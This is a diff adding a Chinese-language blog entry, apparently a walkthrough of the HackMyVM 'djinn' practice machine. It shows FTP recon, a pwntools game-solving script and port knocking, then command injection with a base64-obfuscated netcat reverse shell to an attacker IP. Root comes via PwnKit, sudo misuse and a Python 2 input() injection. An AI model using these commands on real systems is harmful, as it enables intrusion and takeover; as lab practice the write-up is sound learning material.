@@ -167,4 +167,78 @@
         <tag>复盘</tag>
       </tags>
   </entry>
+  <entry>
+    <title>hackmyvm djinn复盘</title>
+    <url>/2024/03/18/hackmyvm-djinn%E5%A4%8D%E7%9B%98/</url>
+    <content><![CDATA[<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://hackmyvm.eu/machines/?v=djin" >https://hackmyvm.eu/machines/?v=djin<i class="fas fa-external-link-alt"></i></a></p>
+<p>难度：easy</p>
+<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>端口扫描，扫到21，1337，7331开放，先用anonymous作为账号密码登陆21号端口，有三个txt文件，下载来看看</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318105541.png" ></p>
+<p>game里面说1337端口有个game，nc连接一下</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318105737.png" ></p>
+<p>是个计算游戏，需要算对一千次，这种就需要写个脚本解决了（以下脚本是参考wp的）</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">c = pwn.remote(<span class="string">&#x27;192.168.64.80&#x27;</span>, <span class="string">&#x27;1337&#x27;</span>) <span class="comment"># 建立一个远程联机</span></span><br><span class="line">c.recvuntil(<span class="string">&#x27;gift.\n&#x27;</span>) <span class="comment"># 接收连接中的数据，直到遇到字符串 &#x27;gift.\n&#x27; 为止</span></span><br><span class="line">count=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> count &lt; <span class="number">1001</span>: <span class="comment"># 做1000次循环</span></span><br><span class="line">   count += <span class="number">1</span></span><br><span class="line">   data = c.recvuntil(<span class="string">b&quot;)&quot;</span>).decode()</span><br><span class="line">   c.recv() <span class="comment"># 接收连接中的数据，但不做任何处理，用于清空缓冲区</span></span><br><span class="line">   <span class="built_in">print</span>(data)</span><br><span class="line">   num1, num2, todo = <span class="built_in">int</span>(data[<span class="number">1</span>]), <span class="built_in">int</span>(data[<span class="number">9</span>]), data[<span class="number">5</span>]</span><br><span class="line">   <span class="keyword">if</span> todo == <span class="string">&quot;+&quot;</span>:</span><br><span class="line">      answer= num1 + num2</span><br><span class="line">   <span class="keyword">elif</span> todo == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">      answer= num1 - num2</span><br><span class="line">   <span class="keyword">elif</span> todo == <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">      answer= num1 * num2</span><br><span class="line">   <span class="keyword">elif</span> todo == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">      answer= num1 / num2</span><br><span class="line">   c.send((<span class="built_in">str</span>(answer) + <span class="string">&quot;\n\r&quot;</span>).encode())</span><br><span class="line">   <span class="keyword">if</span> count &gt; <span class="number">998</span>: <span class="comment"># 打印最后几次的详细信息</span></span><br><span class="line">        <span class="built_in">print</span>(answer, count)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c.recv().decode())</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318110431.png" ></p>
+<p>跑完脚本最后给了三个数字，猜测是敲门，此时22端口是关着的</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318110523.png" ></p>
+<p>按顺序敲门后，22号端口打开了</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318110607.png" ></p>
+<p>接着我想用刚刚拿到的“nitu:81299””nitish81299”尝试登陆ssh，都没有用，这个时候想到之前有个7331端口还没看</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-18%2012.07.20.png" ></p>
+<p>先扫目录，用了一个大一点的字典后扫到有&#x2F;wish &#x2F;genie</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318112555.png" ></p>
+<p>访问&#x2F;wish，有个可以execute的，输入id试试</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318111003.png" ></p>
+<p>跳转到了genie，注意url有出现www-data，说明是执行成功的</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318111039.png" ></p>
+<p>接下来反弹shell，经过多次尝试，发现可以利用拿到第一个shell</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> ` <span class="built_in">echo</span> <span class="string">&quot;cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxOTIuMTY4LjY0LjMgODg4OCA+L3RtcC9m&quot;</span> | <span class="built_in">base64</span> -d ` | sh -</span><br><span class="line"></span><br><span class="line"><span class="built_in">base64</span>解码的内容是：<span class="built_in">rm</span> /tmp/f;<span class="built_in">mkfifo</span> /tmp/f;<span class="built_in">cat</span> /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.64.3 8888 &gt;/tmp/f</span><br><span class="line">管道 ｜sh - 表示讲解码后的内容交给sh当成脚本执行</span><br></pre></td></tr></table></figure>
+
+<h4 id="提权方式1"><a href="#提权方式1" class="headerlink" title="提权方式1"></a>提权方式1</h4><p>拿到第一个shell后，使用find查看有没有什么可以用（sudo -l找不到什么可以用的）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>看到pkexec可以用</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-18%2011.18.35.png" ></p>
+<p>查找到版本是0.105，上网搜索了一下有没有可以用的脚本，最后找到<a class="link"   href="https://www.hackingarticles.in/linux-privilege-escalation-pwnkit-cve-2021-4034/" >https://www.hackingarticles.in/linux-privilege-escalation-pwnkit-cve-2021-4034/<i class="fas fa-external-link-alt"></i></a> 可以用</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-18%2011.21.58.png" ></p>
+<p>成功提权到root</p>
+<h4 id="提权方法2"><a href="#提权方法2" class="headerlink" title="提权方法2"></a>提权方法2</h4><p>切换到home目录下，有nitish和sam两个用户，sam目录进不去，在nitish目录的.dev目录下有个creds.txt</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318112450.png" ></p>
+<p>有一个密码，接下来用ssh登陆nitish账户</p>
+<p>sudo -l发现有个genie可以利用，在网上找现成的提权方式失败</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318112652.png" ></p>
+<p>-h查看帮助，有一个-e执行cmd，但是还是失败了</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318112941.png" ></p>
+<p>然后用man查看genie，发现有个cmd</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318113121.png" ></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u sam /usr/bin/genie -cmd 随便写点</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318113234.png" ></p>
+<p>成功拿到sam的shell</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318113352.png" ></p>
+<p>sudo -l看到有个lago可以利用，执行看看，测试了一下，有几个选项，其中比较有用的是有个猜数游戏</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318113515.png" ></p>
+<h5 id="解决思路1（暴力）"><a href="#解决思路1（暴力）" class="headerlink" title="解决思路1（暴力）"></a>解决思路1（暴力）</h5><p>用个一直循环的脚本，一直坚持猜同一个数字，看运气，总有能猜对的时候</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span> sudo /root/lago; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318113812.png" ></p>
+<h5 id="解决思路2"><a href="#解决思路2" class="headerlink" title="解决思路2"></a>解决思路2</h5><p>在&#x2F;home&#x2F;sam的目录下有个.pyc文件，下载下来反编译一下，就能看到lago的源码，注意到</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318114957.png" ></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-18%2012.08.59.png" ></p>
+<p>选项2那里有个判断，要判断s是否等于num，那直接输入num，input把你传递的num当成了一个变量（注意靶机的pyhton版本是2.x，如果是3以上的版本这个思路不行），num&#x3D;num自然就可以了，神奇。</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318115124.png" ></p>
+<p>也可以利用input的动态载入，也能拿到root</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__import__(&#x27;os&#x27;).system(&#x27;/bin/bash&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>输入这个python2的input支持动态载入，把这个语句当成表达式执行，如果是pyhton3就只会当成字符串</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318113923.png" ></p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这个靶机涉及到的知识点比较多：ftp下载文件，远程计算器脚本的编写，ssh敲门打开端口，反弹shell的绕过方法，pkexec的提权，man查看使用手册（比–help详细），pyc反编译，python2中input的智能转换和动态载入的利用，都很值得学习。</p>
+<p>在整个过程中，信息搜集一如既往的重要。</p>
+]]></content>
+      <tags>
+        <tag>hackmyvm</tag>
+        <tag>复盘</tag>
+      </tags>
+  </entry>
 </search>
